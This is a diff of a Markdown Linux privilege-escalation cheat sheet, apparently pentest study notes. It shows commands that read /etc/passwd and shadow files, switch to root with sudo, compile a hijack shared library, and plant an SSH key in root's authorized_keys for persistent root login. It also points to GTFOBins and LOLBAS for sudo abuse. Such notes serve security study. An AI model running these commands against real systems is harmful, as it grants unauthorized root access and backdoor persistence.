@@ -56,8 +56,9 @@ cat /etc/passwd | cut -d : -f 1
 cat /etc/shadows
 cat /etc/groups
 groups #command
-history
-sudo su -
+history 
+sudo -u user /bin/echo Hello World!	Run a command with sudo
+sudo su -	Switch to root user (if we have access to sudo su)
 ```
 
 
@@ -278,7 +279,9 @@ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 
 
 > [!INFO]
-> Now at last run linux automation scripts like linpeas, , or other automated scripts.
+> Now at last run linux automation scripts like linpeas, , or other automated scripts. GTFOBins contains a list of commands and how they can be exploited through >sudo. We can search for the application we have sudo privilege over, and if it exists, it may tell us the exact command we should execute to gain root access >using the sudo privilege we have.
+
+>LOLBAS also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands >in the context of a privileged user.
 
 
 
@@ -377,7 +380,9 @@ This will give us two files: key (which we will use with ssh -i) and key.pub, wh
 
 user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
 
-
+ssh-keygen -f key	Create a new SSH key
+echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys	Add the generated public key to the user
+ssh root@10.10.10.10 -i key	SSH to the server with the generated private key
 ```
 
 
